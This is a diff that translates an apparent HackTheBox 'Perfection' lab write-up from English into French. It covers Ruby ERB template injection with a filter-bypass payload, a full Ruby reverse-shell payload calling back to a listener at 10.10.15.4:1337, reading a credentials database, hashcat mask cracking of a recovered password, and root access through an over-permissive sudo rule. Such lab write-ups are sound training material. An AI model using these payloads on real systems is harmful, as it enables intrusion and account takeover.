@@ -14,7 +14,7 @@ categories = ['Writeups']
 * OS: Linux
 ---
 
-Perfection begins with a straightforward website. Through enumeration, we identify a vulnerability to Server-Side Template Injection (SSTI), which we exploit to gain an initial foothold. We then discover a database file containing password hashes, but our initial attempts to crack them are unsuccessful. After reading the user's emails, we learn that the passwords follow a specific format. Using this information, we employ a mask attack with Hashcat and successfully recover the password. This allows us to run `sudo -l` and discover that the sudo rules are highly permissive, enabling us to escalate our privileges without needing a password.
+Ce challenge débute avec un site web simple. Grâce à l'énumération, nous identifions une vulnérabilité à l'injection de modèle côté serveur (SSTI), que nous exploitons pour obtenir notre accès initial. Nous découvrons ensuite un fichier de base de données contenant des hachages de mots de passe, mais nos premières tentatives pour les craquer sont infructueuses. Après avoir lu les courriels des utilisateurs, nous apprenons que les mots de passe suivent un format spécifique. En utilisant cette information, nous employons une attaque par masque avec Hashcat et réussissons à récupérer le mot de passe. Enfin, nous exécutons `sudo -l` et découvrons des règles très permissives, nous permettant d'élever nos privilèges sans avoir besoin d'un mot de passe.
 
 Addresse IP cible - `10.10.11.253`
 
@@ -46,65 +46,63 @@ Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds
 
 ## Enumération
 
-The website is a "a tool to calculate the total grade in a class based on category scores and percentage weights."
+Le site web offre un "outil permettant de calculer des notes sur la base des données entrées.
 
-The `Calculate your weighted grade` page lets you use the tool.
+`http://10.10.11.253/weighted-grade-calc` nous permet d'utiliser l'outil.
 
 ![Calculate your weighted grade table](/images/HTB-Perfection/weighed-grade.png)
 
-After filling the table and submitting the grades, we get some weighted grades.
+Après avoir rempli le tableau et soumis les notes, nous obtenons des résultats.
 
 ![Weighted grades](/images/HTB-Perfection/weighed-grade-results.png)
 
-In the footer we notice that the application is using `WEBrick 1.7.0`. 
+En bas de page, nous lisons que l'application utilise `WEBrick 1.7.0`. 
 
 ![Website powered by WEBrick 1.7.0](/images/HTB-Perfection/WEBrick.png)
 
-Searching for vulnerabilities related to this specific version is inconclusive. Attempting directory brute forcing, subdomain, and source code enumeration leads to the same outcome.
+La recherche de vulnérabilités associées à cette version spécifique ne donne aucun résultat. L'énumération des sous-domaines et du code source aboutit au même résultat.
 
-Using the `Wappalyzer` extension reveals that the application is using `Ruby 3.0.2`.
+L'extension `Wappalyzer` révèle que l'application utilise `Ruby 3.0.2`.
 
 ![Wapplyzer results](/images/HTB-Perfection/wappalyzer.png)
 
-Since the application accepts user input we can try some injections attacks. Let's refill the table, capture the request with Burp Suite and send it to the repeater.
+Puisque l'application accepte les entrées de l'utilisateur, nous pouvons essayer quelques attaques par injection. Nous remplissons le tableau, capturons la requête avec Burp Suite et l'envoyons au repeater.
 
-The first test is with `; ls` as the value for `category1`.
+Le premier test est avec ` ; ls` comme valeur pour `category1`.
 
 ![Request in Burp for injection attack](/images/HTB-Perfection/injection-attack.png)
 
-It returns `Malicious input blocked`. Trying various payloads create the same result, there is an input filter that we need to bypass.
+Il renvoie `Malicious input blocked` (entrée malveillante bloquée). Les essais avec différents payloads aboutissent au même résultat, il y a donc un filtre de données qu'il faut contourner.
 
 ![Injection blocked](/images/HTB-Perfection/injection-blocked.png)
 
-On the `WEBrick` github page, we learn that it can handle different things. *Read more [here](https://github.com/ruby/webrick).*
+Sur la page github de `WEBrick`, nous apprenons qu'il peut être utilisé à différentes fins. *Plus d'informations, [ici](https://github.com/ruby/webrick).*
 
 ![WEBrick github page](/images/HTB-Perfection/WEBrick-github.png)
 
-We also learn that ERB is a templating system for Ruby. *Read more [here](https://github.com/ruby/erb).*
+Nous apprenons également qu'ERB est un système de templates pour Ruby. *Plus d'informations, [ici](https://github.com/ruby/erb).*
 
 ![ERB-template page](/images/HTB-Perfection/ERB-template.png)
 
-Being unfamiliar with those technologies I ask ChatGPT how to check if a server is using the Ruby ERB templating system. We will use the third option.
+N'étant pas familier avec ces technologies, nous nous faisons aider par ChatGPT sur comment vérifier si un serveur utilise le système de templating Ruby ERB. Nous utiliserons la troisième option.
 
 ![ERB tests](/images/HTB-Perfection/ERB-test.png)
 
 ## Accès Initial
 
-Trying the payload provided, I get the message: 
+En utilisant la payload indiqué, j'obtiens le message suivant:
 
 `Invalid query parameters: invalid %-encoding (&amp;lt;%= 2 + 2 %&amp;gt;)`.
 
-After a few modifications the payload successfully works! The filter can be bypassed by using `%0A` (for a new line) and URL-encoding.
+Après quelques modifications, il marche avec succès! Le filtre peut être contourné en utilisant `%0A` (pour une nouvelle ligne) et l'encodage d'URL.
 
-> Payload used for the test: `%0A<%25%3d+2+%2b+2+%25>`
+> Payload utilisé pour le test: `%0A<%25%3d+2+%2b+2+%25>`
 
 ![Successful SSTI test](/images/HTB-Perfection/SSTI-working.png)
 
-This confirms that the target is vulnerable to [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby) and is indeed using Ruby ERB. This means that we can execute a reverse shell and gain a foothold.
+Ce résultat confirme que la cible est vulnérable au [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby) et qu'elle utilise effectivement Ruby ERB. Nous pouvons exécuter un reverse shell et accéder au système.
 
-Below is the payload (ruby) used to get a reverse shell, it is from [revshells](https://www.revshells.com/).
-
-**Full payload used for the reverse shell**
+Ci-dessous, le payload (ruby) utilisé pour obtenir un reverse shell, il provient de [revshells](https://www.revshells.com/).
 
 ```
 Chemistry%0A<%25%3d+`ruby+-rsocket+-e'spawn("sh",[%3ain,%3aout,%3aerr]%3d>TCPSocket.new("10.10.15.4",1337))'`+%25>
@@ -112,7 +110,7 @@ Chemistry%0A<%25%3d+`ruby+-rsocket+-e'spawn("sh",[%3ain,%3aout,%3aerr]%3d>TCPSoc
 
 ![Ruby reverse shell](/images/HTB-Perfection/ruby-revshell.png)
 
-We are able to access the system and are connected as the user `susan`. We upgrade the shell with the commands below.
+Nous obtenons une connexion sur notre listener et sommes connectés en tant qu'utilisateur `susan`. Nous améliorons notre shell avec les commandes ci-dessous.
 
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'  
@@ -124,32 +122,32 @@ stty rows 38 columns 116
 
 ![Foothold](/images/HTB-Perfection/foothold.png)
 
-The user flag is found in `/home/susan`.
+Le fichier `user.txt` se trouve dans `/home/susan`.
 
 ![User flag location](/images/HTB-Perfection/user-flag.png)
 
 ## Elévation de Privilèges
 
-We use `linpeas.sh` to find privilege escalation paths and find some useful information.
+Nous utilisons `linpeas.sh` pour trouver des pistes d'escalade de privilèges.
 
-* `susan` is a sudoer
+* `susan` fait partie du groupe sudo
 
 ![User susan is a sudoer](/images/HTB-Perfection/susan-sudoer.png)
 
-* credentials files are found
+* Des fichiers contenant des informations d'identification sont trouvés
 
 ![Credentials files are found](/images/HTB-Perfection/susan-credentials.png)
 
-* The user also has some mail, which might be worth checking out
+* L'utilisateur a également reçu du courrier, qui peut être intéressant à consulter
 
 ![The user has some mail](/images/HTB-Perfection/susan-mail.png)
 
 
-Running `sudo -l` requires a password.
+Il s'avère que nous ne pouvons pas exécuter `sudo -l` sans mot de passe.
 
 ![sudo -l requires password](/images/HTB-Perfection/susan-privesc.png)
 
-The credentials file give us some users hashes including `susan`'s.
+Le fichier de base de données contient des hashs d'utilisateurs dont celui de `susan`.
 
 ```
 strings /home/susan/Migration/pupilpath_credentials.db
@@ -161,15 +159,15 @@ strings /home/susan/Migration/pupilpath_credentials.db
 hashid 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f'
 ```
 
-Running `hashid` reveals that this is a SHA-256 hash. Using hashcat on the hash fails, it seems that it cannot be cracked yet.
+`hashid` révèle qu'il s'agit d'un hash SHA-256. Nous essayons d'utiliser hashcat avec le hachage mais cela échoue.
 
-After reading the mail we find the password structure.
+Après avoir lu le courrier, nous découvrons que le mot de passe utilise une structure spécifique.
 
 ![Reading susan mail](/images/HTB-Perfection/susan-mail1.png)
 
-We try a mask attack and successfully recover the password `susan_nasus_413759210`.
+Nous tentons une attaque par masque et réussissons à récupérer le mot de passe `susan_nasus_413759210`.
 
-> In a mask attack we know about the passwords designs. You can learn more about it [here](https://hashcat.net/wiki/doku.php?id=mask_attack#mask_attack).
+> Dans une attaque par masque, nous avons connaissance des designs des mots de passe. Vous pouvez en lire plus à ce sujet [ici](https://hashcat.net/wiki/doku.php?id=mask_attack#mask_attack).
 
 ```
 hashcat -m 1400 hash.txt -a 3 -d 1 susan_nasus_?d?d?d?d?d?d?d?d?d
@@ -177,18 +175,20 @@ hashcat -m 1400 hash.txt -a 3 -d 1 susan_nasus_?d?d?d?d?d?d?d?d?d
 
 ![Reading susan mail](/images/HTB-Perfection/password-recovered.png)
 
-With that password we log in with SSH. Running `sudo -l` we see that we have a straight path to root.
+Avec ce mot de passe, nous nous connectons via SSH. Avec `sudo -l` nous constatons que nous avons un accès direct à root.
 
 ![sudo -l command](/images/HTB-Perfection/sudo-l.png)
 
-We have a very permissive rule allowing the user `susan` to run any command, as any user or group which effectively gives them full administrative control when using `sudo`. 
+La règle mise en place est très permissive, permettant à l'utilisateur `susan` d'exécuter n'importe quelle commande, en tant que n'importe quel utilisateur ou groupe, ce qui lui donne un contrôle administratif complet lorsque l'on utilise `sudo`. 
 
-By running `sudo su` we get a root shell and find the root flag in `/root`.
+En exécutant `sudo su`, nous obtenons un shell root et trouvons le drapeau root dans `/root`.
 
 ![root flag](/images/HTB-Perfection/root-flag.png)
 
-Thanks for reading my blog and I hope this write up was helpful to you!
-
+Merci d'avoir lu mon blog et j'espère que cet article vous a été utile! Si vous voulez vous exercer au SSTI, jetez un coup d'œil à ces machines sur HackTheBox :
+* [RedPanda](https://app.hackthebox.com/machines/RedPanda/information) (Facile)
+* [Sandworm](https://app.hackthebox.com/machines/Sandworm/information) (Moyen)
+* [Talkative](https://app.hackthebox.com/machines/Talkative/information) (Difficile)
 
 
 
